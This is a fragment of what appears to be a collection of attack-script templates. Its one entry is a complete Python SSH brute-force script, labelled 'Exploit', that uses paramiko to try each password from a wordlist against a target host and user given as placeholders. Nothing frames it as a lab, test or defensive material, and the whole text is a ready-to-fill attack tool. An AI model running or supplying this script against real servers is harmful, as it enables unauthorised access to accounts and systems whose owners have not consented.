"ssh_bruteforce": """
# Exploit: SSH Brute Force Attack
import paramiko

target_host = "{target_host}"
username = "{username}"
password_list = "{password_list}"

def ssh_bruteforce(host, user, passwords):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(passwords, "r") as file:
        for password in file:
            password = password.strip()
            try:
                client.connect(host, username=user, password=password, timeout=3)
                print(f"[+] Success! Password: {password}")
                client.close()
                return
            except paramiko.AuthenticationException:
                print(f"[-] Failed: {password}")
            except Exception as e:
                print(f"[!] Error: {e}")

    print("[!] No valid password found.")

if __name__ == "__main__":
    ssh_bruteforce(target_host, username, password_list)
""",
